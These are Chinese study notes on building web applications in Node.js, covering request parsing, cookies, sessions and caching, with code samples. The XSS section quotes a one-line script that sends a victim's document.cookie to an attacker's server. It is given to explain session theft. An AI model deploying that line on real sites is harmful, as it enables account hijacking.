# 构建 web 应用---报文头 (原文:深入浅出 Node.js)

而本章的 Web 应用方面的内容，将从 http 模块中服务器端的 request 事件开始分析。  
request 事件发生于网络连接建立，客户端向服务器端发送报文，服务器端解析报文，发现 HTTP 请求的报头时。在已触发 request 事件前，它已准备好 ServerRequest 和 ServerResponse 对象以供对请求和响应报文的操作。

```
var http = require('http');
http.createServer(function (req, res) {
   res.writeHead(200, {'Content-Type': 'text/plain'});
   res.end('Hello World\n');
}).listen(1337, '127.0.0.1');
console.log('Server running at http://127.0.0.1:1337/');
```

我们可能有如下这些需求 :

- 请求方法的判断;
- URL 的路径解析;
- URL 中查询字符串解析;
- Cookie 的解析;
- Session(会话)的需求;
- Basic 认证;
- 表单数据的解析;
- 任意格式文件的上传处理;

## 请求方法

HTTP_Parser 在解析请求报文的时候，将报文头抽取出来，设置为 req.method

## 路径解析

HTTP_Parser 将其解析为 req.url

1. 根据路径判断 -- 静态文件

   一般而言，完整的 URL 地址是如下这样的：`http://user:pass@host.com:8080/p/a/t/h?query=string#hash`  
   客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行(`GET /path?foo=bar HTTP/1.1 `)。需要注意的是，hash 部分会被丢弃，不会存在于报文的任何地方 。

2. 根据路径选择控制器 -- `/controller/action/a/b/c`:

   controller 对应到一个控制器，action 对应到控制器的行为，剩余的值会作为参数进行一些别的判断。

## 查询字符串

1. Node 提供了 querystring 模块用于处理这部分数据，例：

   ```
   var url = require('url');
   var querystring = require('querystring');
   var query = querystring.parse(url.parse(req.url).query);

   ```

2. 更简洁的方法：给 url.parse()传递第二个参数，`var query = url.parse(req.url, true).query;`

   它会将 foo=bar&baz=val 解析为一个 JSON 对象，例：{foo:'bar',baz:'val'}

   **注：** 如果查询字符串中的键出现多次，那么它的值会是一个数组，例如：foo=bar&foo=baz 得到 {foo:['bar','baz']}  
   业务的判断一定要检查值是数组还是字符串，否则可能出现 TypeError 异常的情况。

## Cookie

HTTP_Parser 会将所有的报文字段解析到 req.headers 上，那么 Cookie 就是 req.headers.cookie。

客户端发送的 Cookie 在请求报文的 Cookie 字段中，我们可以通过 cul 工具构造这个字段，  
例如：`curl -v -H "Cookie: foo=bar; baz=val" "http://127.0.0.1:1337/path?foo=bar&foo=baz" `

1. cookie 解析：

   ```
   var parseCookie = function (cookie) {
     var cookies = {};
     if (!cookie) {
       return cookies;
     }
     var list = cookie.split(";");
     for (var i = 0; i < list.length; i++) {
       var pair = list[i].split("=");
       cookies[pair[0].trim()] = pair[1];
     }
     return cookies;
   };
   //=======
   req.cookies = parseCookie(req.headers.cookie);
   ```

2. cookie 字段的意思
   响应的 Cookie 值在 Set-Cookie 字段中。规范中对它的定义如下所示：  
    `Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com; `

   - name=value： 是必须包含的部分，其余部分皆是可选参数;
   - path： 表示这个 Cookie 影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个 Cookie;
   - Expires 和 Max-Age： 是用来告知浏览器这个 Cookie 何时过期的;
     1. 如果不设置该选项，在关闭浏览器时会丢失掉这个 Cookie。
     2. 如果设置了过期时间，浏览器将会把 Cookie 内容写入到磁盘中并保存，下次打开浏览器依旧有效。
     3. Expires 的值是一个 UTC 格式的时间字符串，告知浏览器此 Cookie 何时将过期。（如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差）
     4. Max-Age 则告知浏览器此 Cookie 多久后过期。
   - HttpOnly： 告知浏览器不允许通过脚本 document.cookie 去更改这个 Cookie 值。  
     事实上，设置 HttpOnly 之后，这个值在 document.cookie 中不可见。但是在 HTTP 请求的过程中，依然会发送这个 Cookie 到服务器端。
   - Secure：当 Secure 值为 true 时，在 HTTP 中是无效的（不会向服务器传递该信息），在 HTTPS 中才有效（向服务器传递该信息）；

3. cookie 生成：

   ```
   var serialize = function (name, val, opt) {
       var pairs = [name + '=' + encode(val)];
       opt = opt || {};
       if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
       if (opt.domain) pairs.push('Domain=' + opt.domain);
       if (opt.path) pairs.push('Path=' + opt.path);
       if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
       if (opt.httpOnly) pairs.push('HttpOnly');
       if (opt.secure) pairs.push('Secure');
       return pairs.join('; ');
   };
   //===设置单个cookie=======
   res.setHeader('Set-Cookie', serialize('isVisit', '1'));
   //===设置多个cookie=======
   res.setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]);
   ```

4. Cookie 的性能影响：
   - 减小 Cookie 的大小
   - 为静态组件使用不同的域名（多一次 DNS 查询）
   - 减少 DNS 查询（浏览器有缓存）

## Session -->解决 Cookie 被篡改/伪造问题

1. 基于 Cookie:来实现用户和数据的映射；（客户端禁用 Cookie，方法失效）

   将口令放在 Cookie 中。因为口令一旦被簪改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且 Session 的有效期通常较短（普遍 20 分钟），如果有效期内客户端和服务器端没有交互产生，服务器端就将数据删除。由于数据过期时间较短，且在服务器端存储数据，因此安全性相对较高。

   具体：用户发请求时，判断 Cookie 中是否存在口令，以及口令是否过期；

   - 如果请求中没有口令，判定用户是初次访问，生成口令（键值对），将口令存在 Cookie 中随响应一起返回（浏览器做处理），下次请求时带给服务端；
   - 如果请求中有口令，判断口令是否过期：
     1. `过期：` 删除服务器中原来的口令，生成新口令（键值对），将口令存在 Cookie 中随响应一起返回（浏览器做处理），下次请求时带给服务端；
     2. `不过期：`更新服务器中原来的口令，将口令存在 Cookie 中随响应一起返回（浏览器做处理），下次请求时带给服务端；
   - Session 的有效期通常较短，在有效期内客户端和服务器端没有交互产生，服务器端就将数据删除。

   ```
   var sessions = {};
   var key = 'session_id';
   var EXPIRES = 20 * 60 * 1000;
   //=====================================
   var generate = function () {
    var session = {};
    session.id = (new Date()).getTime() + Math.random();
    session.cookie = {
       expire: (new Date()).getTime() + EXPIRES
    };
    sessions[session.id] = session;
    return session;
   };
   //===================================
   function (req, res) {
     var id = req.cookies[key];
     if (!id) {
       req.session = generate();
     } else {
       var session = sessions[id];
       if (session) {
         if (session.cookie.expire > new Date().getTime()) {
           //更新超时时间
           session.cookie.expire = new Date().getTime() + EXPIRES;
           req.session = session;
         } else {
           //超时了，刷除旧的数据，并重新生成
           delete sessions[id];
           req.session = generate();
         }
       } else {
         // 如过session过期或口今不对，重新生成session
         req.session = generate();
       }
     }
     handle(req, res); //处理函数
   }
   ```

2. 通过查询宇符串来实现浏览器端和服务器端数据的对应；

   用户访问`http:/localhost/pathnamel`时，如果服务器端发现查询字符串中不带 session_id 参数，就会将用户跳转到`http:localhost/pathname?session_id=12344567`这样一个类似的地址。如果浏览器收到 302 状态码和 Location 报头，就会重新发起新的请求；  
   **注：** 也需要检测 session 是否过期；禁用 Cookie 时用；不安全（将 url 发给别人）

3. Session 与内存

   - 问题：

     1. node 对内存有限制，将 Session 直接存在内存中可能接触到内存上限；并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。

     2. 另一个问题，我们可能为了利用多核 CPU 而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node 的进程与进程之间是不能直接共享内存的，用户的 Session 可能会引起错乱。

   - 解决方法：将 Session 集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。  
     目前常用的工具是 Redis、Memcached 等，通过这些高效的缓存，Node 进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在 Node 中自行设计缓存策略更好。

4. Session 与安全

   - 理论上自行设计的随机算法的口令容易命中有效的口令值；--》将口令通过私钥加密进行签名，使得伪造的成本较高。
   - 将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。这些独有信息包括用户 IP 和用户代理(User Agent)

5. XSS 漏洞--跨站脚本攻击  
   它的主要形成原因多数是用户的输人没有被转义，而被直接执行。

   `location.href = "http://c.com/?" + document.cookie` 这段代码将该用户的 Cookie 提交给了 c.com 站点，这个站点就是攻击者的服务器，他也就能拿到该用户的 Session 口令。然后他在客户端中用这个口令伪造 Cookie,从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。

## 缓存

大多少缓存只应用在 GET 请求中，post、delete、put 这类带`行为性`的请求一般不做缓存；

## Basic 认证 ---》缺点太多
